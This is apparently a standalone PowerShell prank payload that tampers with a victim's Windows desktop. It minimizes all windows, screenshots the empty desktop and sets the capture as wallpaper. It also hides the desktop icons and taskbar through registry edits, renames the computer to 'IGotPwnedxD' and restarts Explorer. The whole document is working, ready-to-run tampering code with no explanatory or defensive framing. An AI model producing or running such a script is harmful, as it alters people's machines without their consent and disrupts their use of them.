$TempPath = [System.IO.Path]::GetTempPath()
$ScreenshotPath = "$TempPath\screenshot.jpg"

# Create a Shell object
$Shell = New-Object -ComObject Shell.Application

# Minimize all windows
$Shell.MinimizeAll()

# Small delay to allow minimize
Start-Sleep -Milliseconds 500

# Take a screenshot
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$ScreenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$Screenshot = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
$Graphics = [Drawing.Graphics]::FromImage($Screenshot)
$Graphics.CopyFromScreen($ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
$Screenshot.Save($ScreenshotPath, [Drawing.Imaging.ImageFormat]::Jpeg)

# Set the screenshot as wallpaper
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(0x0014, 0, $ScreenshotPath, 0x01 -bor 0x02)

# Hide all desktop icons
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1

# Rename computer
Rename-Computer -NewName "IGotPwnedxD"

# Hide Taskbar
&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v}

# Restart Explorer
Get-Process "explorer"| Stop-Process

# Restore all windows
$Shell.UndoMinimizeAll()
